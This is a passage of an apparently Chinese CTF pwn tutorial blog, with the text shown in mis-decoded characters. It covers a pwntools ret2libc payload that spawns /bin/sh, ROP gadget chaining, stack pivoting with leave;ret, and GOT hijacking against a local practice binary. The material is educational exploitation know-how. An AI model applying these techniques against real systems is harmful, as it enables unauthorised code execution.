</span></span><span class="line"><span class="cl">    <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span>           <span class="c1"># æ”¾å…¥å‚æ•°åœ°å€ï¼ˆç»™ rdiï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>           <span class="c1"># æ”¾å…¥ system åœ°å€ï¼ˆè·³è½¬æ‰§è¡Œï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å‘é€ payload åˆ°ç¨‹åºï¼ˆå‡è®¾é€šè¿‡ç®¡é“è¿æ¥ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vuln&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>  <span class="c1"># äº¤äº’è·å– shell</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>ret2libc</code> è°ƒç”¨ <code>system(&quot;/bin/sh&quot;)</code> çš„æ ¸å¿ƒé€»è¾‘æ˜¯ï¼š</p>
<p><strong>ç”¨ <code>pop rdi; ret</code> æŠŠæ ˆä¸­çš„ <code>&quot;/bin/sh&quot;</code> åœ°å€ â€œæ¬â€ åˆ° <code>rdi</code> å¯„å­˜å™¨ï¼Œå†è·³è½¬åˆ° <code>system</code> å‡½æ•°</strong>ã€‚</p>
<p>æ•´ä¸ªè¿‡ç¨‹å®Œå…¨ä¾èµ–æ ˆæº¢å‡ºæ§åˆ¶ç¨‹åºæ‰§è¡Œé¡ºåºï¼Œä¸éœ€è¦ç¨‹åºä¸­å­˜åœ¨ç°æˆçš„ shell å‡½æ•°ï¼Œä¹Ÿä¸éœ€è¦æ ˆå¯æ‰§è¡Œï¼Œå› æ­¤é€‚ç”¨æ€§æå¼ºã€‚</p>
<p>åœ¨è¿™é‡Œå¼€å§‹å°±éœ€è¦åˆ·ç‚¹PWNé¢˜äº†ï¼Œæˆ‘æ¯”è¾ƒæ¨èçš„æ˜¯ctfshowï¼Œè´­ä¹°å®˜ç½‘å¥—é¤æˆ–è€…å»å’¸é±¼ä¸Šä¹°ç½‘ç›˜ä¿å­˜çš„ctfshow-pwné¢˜ä¹Ÿè¡Œï¼Œçœ‹è‡ªå·±é¢„ç®—ï¼Œåœ¨è¿™é‡Œæˆ‘å°±ä¼šåŒæ­¥è¿›è¡Œwriteup_pwnçš„ç¼–å†™äº†ã€‚</p>
<h2 id="rop-å‰ä¼ ">ROP å‰ä¼ 
</h2><p>ROPï¼ˆReturn-Oriented Programmingï¼Œè¿”å›å¯¼å‘ç¼–ç¨‹ï¼‰æ˜¯ä¸€ç§é«˜çº§æ¼æ´åˆ©ç”¨æŠ€æœ¯ï¼Œä¸»è¦ç”¨äºåœ¨å†…å­˜ä¿æŠ¤æœºåˆ¶ï¼ˆå¦‚ NX/DEPï¼Œå³ä»£ç æ®µä¸å¯æ‰§è¡Œï¼‰é™åˆ¶ä¸‹ï¼Œé€šè¿‡æ‹¼æ¥ç¨‹åºä¸­å·²æœ‰çš„ä»£ç ç‰‡æ®µï¼ˆç§°ä¸º â€œgadgetâ€ï¼‰æ¥æ„é€ æ”»å‡»é€»è¾‘ï¼Œå®ç°å¯¹ç¨‹åºçš„æ§åˆ¶ã€‚</p>
<p>å¾ˆå¤šæƒ…å†µä¸‹ï¼Œç¨‹åºä¸­æˆ‘ä»¬èƒ½å¤Ÿåˆ©ç”¨çš„åªæœ‰æ ˆã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç¨‹åºä¸­æ²¡æœ‰ä¸€ä¸ªå¯è¯»å¯å†™å¯æ‰§è¡Œçš„åŒºåŸŸè®©æˆ‘ä»¬è¾“å…¥shellcodeã€‚åŒæ—¶ï¼Œå¤§å¤šæ•°é¢˜ç›®ä¹Ÿä¸ä¼šé‚£ä¹ˆå¥½å¿ƒç»™ä½ ç•™ä¸€ä¸ªåé—¨å‡½æ•°ç›´æ¥æ‰§è¡Œsystemã€‚é‚£ä¹ˆè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å°±è¦åˆ©ç”¨ROPã€‚æˆ‘ä»¬ä¸èƒ½è¿è¡Œshellcodeï¼Œä¹Ÿæ²¡æœ‰åé—¨å‡½æ•°ä¸€æ­¥åˆ°ä½ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¨‹åºä¸­çš„ä¸€äº›æŒ‡ä»¤ç‰‡æ®µï¼Œä¸€ç‚¹ç‚¹æ‹¼æ¥èµ·æ¥ï¼Œæ‹¼æˆæˆ‘ä»¬æƒ³è¦çš„æ ·å­ã€‚æ€ä¹ˆæ‹¼ï¼Ÿ</p>
<p>æ‹¿system(&quot;â€œ/bin/sh&quot;);ä¸¾ä¾‹ï¼š</p>
<p>æˆ‘ä»¬è¦å°†rdiæ”¹æˆ/bin/shè¿™ä¸ªå­—ç¬¦ä¸²çš„åœ°å€ï¼Œç„¶åcall systemã€‚ä¸èƒ½æ‰§è¡Œshellcodeï¼Œæ€ä¹ˆæ”¹ï¼Ÿæˆ‘ä»¬æœ‰æ ˆï¼ˆä¼ é€’å‚æ•°ï¼‰!  pop rdi ret + /bin/sh addr</p>
<p>ä¸èƒ½shellcodeï¼Œæ€ä¹ˆcallï¼Ÿæˆ‘ä»¬æœ‰ret!
æ‰€ä»¥ï¼Œæˆ‘ä»¬æ„é€ çš„payloadå°±æ˜¯ï¼š
padding + pop rdi; ret + /bin/sh + system</p>
<p>ROPå°±æ˜¯æ­ç§¯æœ¨ï¼Œç”¨ä¸€ä¸ªä¸ªå°å°çš„ç‰‡æ®µæ¥å®Œæˆå¤æ‚çš„å·¥ä½œï¼ŒåŸºæœ¬åªéœ€è¦ç”¨åˆ°æ ˆè¿™äº›å°å°çš„ç§¯æœ¨ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºgadgetæ€ä¹ˆæ‰¾gadgetå‘¢?</p>
<p><strong>ropper &amp; ROPgadgets</strong>ï¼ˆè‡ªè¡Œå®‰è£…ï¼‰å¯ä»¥å¸®æˆ‘ä»¬å¯»æ‰¾</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary file 
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¦‚æœè¦æ‰¾ç‰¹å®šå¯„å­˜å™¨æˆ–è€…è¿”å›å€¼ï¼Œå¯ä»¥åœ¨åé¢åŠ ï¼Œæ¯”å¦‚å›¾çš„æŒ‡ä»¤:</p>
<p><img src="/p/pwn-2/2.png"
	width="1265"
	height="375"
	srcset="/p/pwn-2/2_hu_5a7538fd605e720d.png 480w, /p/pwn-2/2_hu_a866cc865737ff56.png 1024w"
	loading="lazy"
	
		alt="PWN_042çš„ç¤ºä¾‹ï¼šä½¿ç”¨ROPgadget"
	
	
		class="gallery-image" 
		data-flex-grow="337"
		data-flex-basis="809px"
	
></p>
<p>æ¥ä¸ªä¾‹å­ï¼š</p>
<p>read(0,buf,200);å‘bufä¸Šå†™æ•°æ®ï¼ˆ/bin/shï¼‰ï¼Œbufåœ°å€å·²çŸ¥ï¼›system(buf);å³æ‰§è¡Œsystem(&quot;/bin/sh&quot;)ï¼›</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rdi</span> <span class="mi">0</span><span class="c1">;   //ç¬¬ä¸€ä¸ªå‚æ•°0</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rsi</span> <span class="nv">buf</span><span class="c1">; //ç¬¬äºŒä¸ªå‚æ•° bufåœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rdx</span> <span class="mi">200</span><span class="c1">; //ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå†™å…¥çš„é•¿åº¦</span>
</span></span><span class="line"><span class="cl"><span class="nf">call</span> <span class="nv">read</span><span class="c1">;   //è°ƒç”¨read</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rdi</span> <span class="nv">buf</span><span class="c1">; //ç¬¬ä¸€ä¸ªå‚æ•° bufåœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="nf">call</span> <span class="nv">system</span><span class="c1">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ROPä¼ å‚ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pop rdi;retï¼›
</span></span><span class="line"><span class="cl">0
</span></span><span class="line"><span class="cl">pop rsi;ret;
</span></span><span class="line"><span class="cl">buf
</span></span><span class="line"><span class="cl">pop rdx;retï¼›
</span></span><span class="line"><span class="cl">200
</span></span><span class="line"><span class="cl">read
</span></span><span class="line"><span class="cl">pop rdi;ret;
</span></span><span class="line"><span class="cl">buf
</span></span><span class="line"><span class="cl">systemï¼›
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¾ˆæŠ½è±¡ï¼Ÿé‚£æˆ‘ä»¬å¯ä»¥çœ‹å›è¿™ä¸ªä¾‹å­ï¼š</p>
<p><img src="/p/pwn-2/2.png"
	width="1265"
	height="375"
	srcset="/p/pwn-2/2_hu_5a7538fd605e720d.png 480w, /p/pwn-2/2_hu_a866cc865737ff56.png 1024w"
	loading="lazy"
	
		alt="PWN_042çš„ç¤ºä¾‹ï¼šä½¿ç”¨ROPgadget"
	
	
		class="gallery-image" 
		data-flex-grow="337"
		data-flex-basis="809px"
	
></p>
<p>çœ‹åˆ°é‡Œé¢çš„ä¸€äº›åœ°å€pop rdi;retä¹‹ç±»çš„ï¼Œå†çœ‹å›ä¸Šé¢çš„ï¼Œä½ å°±èƒ½è¯»æ‡‚æ˜¯ä»€ä¹ˆæ„æ€ã€‚</p>
<p>ä½†æ˜¯åœ¨å®é™…æƒ…å†µä¸‹ï¼Œå¹¶ä¸ä¸€å®šæœ‰åƒä¹‹å‰ä¸¾çš„ä¾‹å­ä¸€æ ·çš„gadgetä¾›æˆ‘ä»¬ä½¿ç”¨ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦ä¸€ä¸ªgadget,æ¯”å¦‚poprsiï¼›ret,ç¨‹åºä¸­ä¸ä¸€å®šä¼šæœ‰ï¼Œè¿™æ—¶å€™å°±éœ€è¦è°ƒåŠ¨æˆ‘ä»¬çš„æ€ç»´èƒ½åŠ›ï¼Œæ›²çº¿æ•‘å›½ï¼Œé€šè¿‡åˆ«çš„æ–¹å¼æ¥å®ŒæˆROPã€‚</p>
<blockquote class="alert alert-note">
    <blockquote>
<p>é€šç”¨ROPï¼š
åœ¨64ä½ç¨‹åºä¸­ï¼Œå‡½æ•°çš„å‰6ä¸ªå‚æ•°æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’çš„ï¼Œä½†æ˜¯å¤§å¤šæ•°æ—¶å€™ï¼Œæˆ‘ä»¬å¾ˆéš¾æ‰¾åˆ°æ¯ä¸€ä¸ªå¯„å­˜å™¨å¯¹åº”çš„gadgetsã€‚</p>
<p><img src="/p/pwn-2/3.png"
	width="1065"
	height="296"
	srcset="/p/pwn-2/3_hu_d894993e4110c0f0.png 480w, /p/pwn-2/3_hu_6bafde7ec4c92de7.png 1024w"
	loading="lazy"
	
		alt="ç¤ºä¾‹"
	
	
		class="gallery-image" 
		data-flex-grow="359"
		data-flex-basis="863px"
	
></p>
<p>è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨x64ä¸‹çš„libc_csu_init ä¸­çš„gadgetsã€‚</p>
<p>è¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥å¯¹ ibc è¿›è¡Œåˆå§‹åŒ–æ“ä½œçš„ï¼Œè€Œä¸€èˆ¬çš„ç¨‹åºéƒ½ä¼šè°ƒç”¨libcå‡½æ•°ï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°ä¸€å®šä¼šå­˜åœ¨ã€‚</p></blockquote></blockquote>
<p>æœ¬ç« çš„ROPä»‹ç»åˆ°è¿™å•¦ã€‚</p>
<h2 id="rop">ROP++
</h2><p>é€šè¿‡ä¹‹å‰çš„è®¤è¯†ï¼Œæˆ‘ä»¬å‘ç°ROPå½¢å¼ä¸ŠæŠŠä»£ç ç‰‡æ®µåˆ†æ•£åœ¨ç¨‹åºä»£ç ä¸­ã€‚ROPé€šè¿‡æ ˆæ¥ç»´æŠ¤æ•´ä¸ªé“¾çš„é€»è¾‘ã€‚
ä½†å¦‚æœæ ˆæº¢å‡ºå­—èŠ‚ä¸å¤Ÿæ€ä¹ˆåŠï¼Ÿ</p>
<p>æ€è·¯ä¸€ï¼šone punch!</p>
<p>libcä¸­æœ‰æ²¡æœ‰è¿™ä¹ˆä¸€æ®µä»£ç ï¼Œç›´æ¥å°±è¿è¡Œsystem(â€œ/bin/shâ€)å‘¢ï¼Ÿè¿™æ ·æˆ‘ä»¬å°±ä¸éœ€è¦ä¼ é€’å‚æ•°ï¼Œç›´æ¥å°†è¿”å›åœ°å€è¦†ç›–åˆ°é‚£é‡Œå°±å¥½äº†ã€‚
ç­”æ¡ˆæ˜¯ï¼šæœ‰ï¼Œè€Œä¸”ä¸æ­¢ä¸€ä¸ªã€‚è¿™ç§ä¸€æ­¥åˆ°ä½çš„gadgetï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º<strong>one gadget</strong>ã€‚</p>
<p>çœ‹èµ·æ¥åƒæ¢­å“ˆçš„ï¼Œå¾ˆæ–¹ä¾¿å–”ï¼ä½†æ˜¯åˆå±€é™æ€§çš„ï¼Œ</p>
<p>å¸ˆå‚…ï¼Œé‚£æˆ‘è¿˜å­¦ä»€ä¹ˆROPï¼Œç›´æ¥æ¯æ¬¡ä¸€æ­¥åˆ°ä½ä¸å°±å¾—äº†ï¼Ÿæƒ³æ³•æ€»æ˜¯å¥½çš„ï¼Œä½†æ˜¯ç°å®æ˜¯å¾ˆå·®å¼ºäººæ„çš„ã€‚
onegadgeté€šå¸¸æœ‰å˜é‡è¦æ±‚ï¼Œæ¯”å¦‚æ ˆä¸­çš„æŸä¸ªåç§»å¤„å€¼å¿…é¡»ä¸º0ï¼Œraxå¿…é¡»ä¸º0ã€‚æ‰€ä»¥è¯´ï¼Œonegadgetè¿™ä¸ªä¸œè¥¿ï¼Œæ¯”è¾ƒç„å­¦ï¼Œä¸é è°±ã€‚</p>
<p>æ€è·¯äºŒï¼šæ²¡æ¡ä»¶åˆ›é€ æ¡ä»¶</p>
<p>è®¡ç®—æœºæ˜¯æ€ä¹ˆçŸ¥é“æ ˆçš„ï¼Ÿç­”ï¼šé€šè¿‡rbprsp</p>
<p>ROPæ€ä¹ˆç»´æŠ¤é€»è¾‘çš„?ç­”ï¼šé€šè¿‡ä¸€ç³»åˆ—çš„popå’Œretæ“ä½œï¼Œä¾é rspã€‚</p>
<p>æº¢å‡ºå­—èŠ‚ä¸å¤Ÿï¼Œropå†™ä¸å®Œï¼Œrspä¸€æ¡è·¯èµ°åˆ°é»‘ï¼Œä¸€é¡¿popretæ“ä½œåè·‘åˆ°äº†æˆ‘ä»¬æº¢å‡ºæ§åˆ¶åŒºåŸŸå¤–ã€‚</p>
<p>é—®é¢˜å½’çº³æ€»ç»“ï¼šæº¢å‡ºå­—èŠ‚ä¸å¤Ÿåªæ˜¯åŸå› ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯è®©rspåœ¨æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶çš„åŒºåŸŸè‡ªç”±é£ç¿”ã€‚</p>
<h3 id="æ ˆè½¬ç§»">æ ˆè½¬ç§»
</h3><p>åªè¦æ§åˆ¶rspä¸€ç›´åœ¨æˆ‘ä»¬å¯æ§åˆ¶å†…å®¹çš„åŒºåŸŸï¼Œå°±å¯ä»¥å®Œæˆropã€‚é‚£ä¹ˆï¼Œå¦‚ä½•æ§åˆ¶RSP?å…¶å®å°±æ˜¯mov rsp XXX è¿™ç§æ•ˆæœã€‚æœ‰æ²¡æœ‰mov rsp raxï¼›retï¼Œæˆ–è€…pop rspï¼›retè¿™ç§gadgetså‘¢?ç†è®ºä¸Šåº”è¯¥æœ‰çš„ï¼Œä½†æ˜¯å®é™…æƒ…å†µä¸‹æå…¶å°‘è§ã€‚é‚£ä¹ˆï¼Œé™¤äº†pushå’Œpopï¼Œè¿˜æœ‰æ²¡æœ‰å…¶ä»–å¸¸è§æŒ‡ä»¤èƒ½å¯¹rspå€¼è¿›è¡Œæ›´æ”¹å‘¢?</p>
<p>é‚£å°±æ˜¯<em><strong>leave ret</strong></em>ï¼Œ<code>leave</code>æŒ‡ä»¤çš„å®é™…æ•ˆæœå°±æ˜¯mov rsprbp; pop rbpï¼›ç”¨äºæ¢å¤æ ˆå¸§ï¼Œé€šå¸¸ä¸retè¿ç”¨ã€‚
è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œleaveå°†rbpçš„å€¼ç¬¦ç»™äº†rspã€‚
ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬<strong>æ§åˆ¶äº†rbpæŒ‡é’ˆï¼Œå°±å¯ä»¥æ§åˆ¶rsp</strong>ã€‚</p>
<h4 id="æ ˆè½¬ç§»ç¬¬ä¸€ç§æ–¹æ³•">æ ˆè½¬ç§»ç¬¬ä¸€ç§æ–¹æ³•
</h4><p>pop rbp; ret+ leave; ret</p>
<p>ropçš„æ„æˆï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pop rbp;ret;
</span></span><span class="line"><span class="cl">target stack address
</span></span><span class="line"><span class="cl">leave;ret;
</span></span></code></pre></td></tr></table>
</div>
</div><p>é¦–å…ˆåˆ©ç”¨pop rbp retæ¥æ§åˆ¶rbpæŒ‡é’ˆçš„å€¼ä¸ºæˆ‘ä»¬æƒ³è¦å°†æ ˆè½¬ç§»åˆ°çš„åœ°å€ï¼Œç„¶åæ‰§è¡Œleaveï¼›retæ¥æ§åˆ¶rspæŒ‡é’ˆã€‚</p>
<p>æˆ‘ä»¬è®¡ç®—ä¸€ä¸‹æ€»å…±æº¢å‡ºçš„å­—èŠ‚ï¼Œpop rbpï¼› retçš„åœ°å€ä¸ºè¿”å›åœ°å€ï¼Œåç»­çš„æ‰€éœ€è¦çš„<strong>æº¢å‡ºå­—èŠ‚æ•°ä»…ä»…ä¸º16å­—èŠ‚</strong>ï¼Œå¦‚æœç®—ä¸Šæº¢å‡ºè¦†ç›–åˆ°çš„rbpæŒ‡é’ˆå’Œè¿”å›åœ°å€ï¼Œ
é‚£ä¹ˆä¸€å…±æ˜¯32å­—èŠ‚ã€‚ç„¶åæ ˆè½¬ç§»åˆ°æˆ‘ä»¬ç›®æ ‡çš„åœ°å€ä¸Šç»§ç»­æ‰§è¡Œropã€‚</p>
<h4 id="æ ˆè½¬ç§»ç¬¬äºŒç§æ–¹æ³•">æ ˆè½¬ç§»ç¬¬äºŒç§æ–¹æ³•
</h4><p>ä¸¤æ¬¡leave ret</p>
<p>ropæ„æˆï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">target stack address
</span></span><span class="line"><span class="cl">leave ret;
</span></span><span class="line"><span class="cl">leave ret;
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™ç§æ–¹å¼ä¸ä¸Šä¸€ç§æ–¹å¼å¤§åŒå°å¼‚ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦å°†æ ˆä¸Šä¿å­˜çš„rbpï¼ˆä¹Ÿå°±æ˜¯è¿”å›åœ°å€ä¹‹å‰ï¼‰æ”¹æˆè¿ç§»çš„åœ°å€ã€‚ç¨‹åºåœ¨ç¬¬ä¸€æ¬¡æ‰§è¡Œleave retæ—¶ï¼Œä¼šå°†rbpæåˆ°ç›®æ ‡è¿ç§»åœ°å€ä¸Šã€‚å†æ¬¡æ‰§è¡Œleave retæ—¶ï¼Œæ•ˆæœå°±å’Œä¹‹å‰ä¸€æ ·äº†ã€‚</p>
<p>é‚£ä¹ˆæº¢å‡ºå­—èŠ‚ä»…ä»…éœ€è¦8ä¸ªå­—èŠ‚ï¼Œç®—ä¸Šè¦†ç›–çš„rbpä»¥åŠè¿”å›åœ°å€ï¼Œä¸€å…±éœ€è¦24å­—èŠ‚æº¢å‡ºã€‚</p>
<p><strong>å¦‚æœæˆ‘ä»¬æº¢å‡ºçš„å‡½æ•°æœ¬èº«ç»“å°¾å¸¦æœ‰leaveï¼›retï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æº¢å‡º16å­—èŠ‚ï¼Œåªéœ€è¦è¦†ç›–åˆ°è¿”å›åœ°å€å³å¯</strong>ã€‚</p>
<p>æ€»ä¹‹ï¼Œæ ˆè½¬ç§»é€šè¿‡å°† <code>rsp</code> æŒ‡å‘å¯æ§åŒºåŸŸï¼Œè§£å†³äº†ä»¥ä¸‹é—®é¢˜ï¼š</p>
<ol>
<li>åŸå§‹æ ˆç©ºé—´ä¸è¶³ï¼Œæ— æ³•æ„é€ é•¿ ROP é“¾ï¼›</li>
<li>åˆ©ç”¨å †æˆ–å…¶ä»–å¯å†™åŒºåŸŸï¼ˆå¦‚ <code>.bss</code> æ®µï¼‰ä½œä¸ºæ–°æ ˆï¼Œç»•è¿‡æ ˆä¿æŠ¤æœºåˆ¶ï¼›</li>
<li>ä¸²è”å¤šä¸ªåˆ†æ•£çš„ gadgetï¼Œå®ç°å¤æ‚æ”»å‡»é€»è¾‘ï¼ˆå¦‚è°ƒç”¨ <code>execve</code> æˆ–æ³„éœ² libc åœ°å€ï¼‰ã€‚</li>
</ol>
<p>å…¶æœ¬è´¨æ˜¯åˆ©ç”¨ <code>leave</code> æŒ‡ä»¤å¯¹ <code>rbp</code> å’Œ <code>rsp</code> çš„å…³è”å…³ç³»ï¼Œé€šè¿‡æ§åˆ¶ <code>rbp</code> é—´æ¥ â€œåŠ«æŒâ€ æ ˆæŒ‡é’ˆï¼Œæ˜¯ ROP è¿›é˜¶åˆ©ç”¨ä¸­çš„å…³é”®æŠ€æœ¯ã€‚</p>
<h2 id="æ”¹å†™gotè¡¨getshellæ–¹æ³•">æ”¹å†™.gotè¡¨getshellæ–¹æ³•
</h2><p>æˆ‘ä»¬æ€è€ƒä¸€ä¸‹ï¼Œç¨‹åºè°ƒç”¨å‡½æ•°éƒ½æ˜¯é€šè¿‡è®¿é—®gotè¡¨ã€‚
å¦‚æœæˆ‘ä»¬å°†.gotè¡¨ä¸­åŸæœ¬å­˜æ”¾æ¯”å¦‚è¯´putså‡½æ•°çš„åœ°å€ï¼Œæ”¹æˆsystemå‡½æ•°çš„åœ°å€ï¼Œè¿™æ ·ç¨‹åºæƒ³è¦è°ƒç”¨putsæ—¶ï¼Œå®é™…è°ƒç”¨çš„å´æ˜¯systemï¼Œåˆ©ç”¨è¿™ç§æ–¹å¼getshellï¼Œä¸æ˜¯å¾ˆå¥½å—ï¼Ÿ</p>
<p>è¿™ç§æ–¹å¼å«åšgotè¡¨åŠ«æŒï¼Œæ˜¯ä¸€ç§é—´æ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµçš„æ–¹å¼ã€‚</p>
<p>GOTçš„åœ°å€ï¼Œåœ¨æ²¡å¼€PIEçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨IDAä¸­æŸ¥çœ‹ï¼Œä¹Ÿå¯ä»¥ç”¨pwntoolsæŒ‡ä»¤æŸ¥è¯¢ï¼šelf.GOT[&ldquo;puts&rdquo;]</p>
<p><img src="/p/pwn-2/4.png"
	width="999"
	height="321"
	srcset="/p/pwn-2/4_hu_6233a4acaebdd711.png 480w, /p/pwn-2/4_hu_2afefb642b4f59a8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="311"
		data-flex-basis="746px"
	
></p>
<p>åœ¨æˆ‘ä»¬åŠ«æŒgotè¡¨æ—¶ï¼Œå¸¸è§çš„æœ‰å¦‚ä¸‹å‡ ç§ï¼š
puts(buf)ã€ ã€atoi(buf)ã€atol(buf)ã€free(buf)</p>
<p>freeåœ¨å½“å‰é˜¶æ®µå°‘è§ï¼Œåœ¨åç»­çš„å †ä¼šå¾ˆå¸¸è§ã€‚</p>
<p>æ€»çš„æ¥è¯´ï¼ŒæŠŠè¿™äº›ç¬¬ä¸€ä¸ªå‚æ•°ä¹Ÿå°±æ˜¯rdiæŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬å¯ä»¥æ§åˆ¶è¾“å…¥çš„åŒºåŸŸçš„å‡½æ•°ï¼Œæ”¹æˆsystemï¼Œè¿™æ ·ï¼Œå½“æˆ‘ä»¬ç¨‹åºæ‰§è¡Œåˆ°è°ƒç”¨è¿™äº›å‡½æ•°æ—¶ï¼Œç¨‹åºå°±è¢«åŠ«æŒåˆ°æˆ‘ä»¬ç›®æ ‡å‡½æ•°å¤„äº†ã€‚</p>
<p>å¦‚ä½•æ”¹å†™ï¼Ÿ</p>
<p>ROP: read (0, got, size)ï¼›</p>
<p>è¾¾åˆ°ä»»æ„å†…å­˜åœ°å€å†™åï¼Œä¸èƒ½ç¡®å®šæ ˆåœ°å€ï¼Œè€ƒè™‘å†™gotã€‚</p>
<p>bssç­‰æ®µè¶Šç•Œè®¿é—®(è´Ÿå€¼)ã€‚</p>
<p>ä¸»è¦çœ‹ç¨‹åºé€»è¾‘ï¼Œå…·ä½“é—®é¢˜å…·ä½“åˆ†æã€‚</p>
<h2 id="pwnæ ˆæº¢å‡ºé¢˜çš„ä¸€èˆ¬è§£é¢˜æ€è·¯">PWNæ ˆæº¢å‡ºé¢˜çš„ä¸€èˆ¬è§£é¢˜æ€è·¯
</h2><p>ç›´æ¥æ§åˆ¶æ‰§è¡Œæµï¼šshellcode &amp;ROP</p>
<p>é—´æ¥æ§åˆ¶æ‰§è¡Œæµï¼šæ”¹å†™å‡½æ•°æŒ‡é’ˆï¼Œå¦‚gotè¡¨ã€‚</p>
<p>ä¿æŠ¤æœºåˆ¶ç»•è¿‡ï¼šcanaryã€ASLRã€PIE</p>
<p>æ–¹æ³•è®º</p>
<h3 id="ç¬¬ä¸€æ­¥æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯checksecçœ‹æ¶æ„ä¿æŠ¤ä¿¡æ¯">ç¬¬ä¸€æ­¥ã€æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ï¼ˆchecksecçœ‹æ¶æ„ã€ä¿æŠ¤ä¿¡æ¯ï¼‰
</h3><blockquote>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œæ ˆé¢˜ç›®éƒ½ä¼šæˆ–å¤šæˆ–å°‘å…³é—­ä¸€äº›ä¿æŠ¤ã€‚
å¦‚æœå…³äº†canaryï¼Œé‚£ä¹ˆå¤§æ¦‚ç‡æ˜¯æ ˆé¢˜ã€‚å¦‚æœå¼€å¯äº†PIEï¼Œé‚£ä¹ˆå°±éœ€è¦æ‰¾ä¸ªåœ°æ–¹æ³„æ¼åœ°å€ä¿¡æ¯ã€‚å¦‚æœå¼€å¯äº† FULL RELROï¼Œé‚£ä¹ˆæ€è·¯å°±ä¸åº”è¯¥æ˜¯æ”¹å†™gotã€‚</p></blockquote>
<h3 id="ç¬¬äºŒæ­¥ç†æ¸…å‡½æ•°é€»è¾‘å¦‚ä½•æ‰§è¡Œ">ç¬¬äºŒæ­¥ã€ç†æ¸…å‡½æ•°é€»è¾‘ï¼ˆå¦‚ä½•æ‰§è¡Œï¼Ÿï¼‰
</h3><blockquote>
<p>ç›´æ¥åœ¨linuxä¸­è¿è¡Œï¼Œä¸¢è¿›idaï¼Œé™æ€åˆ†æã€‚</p>
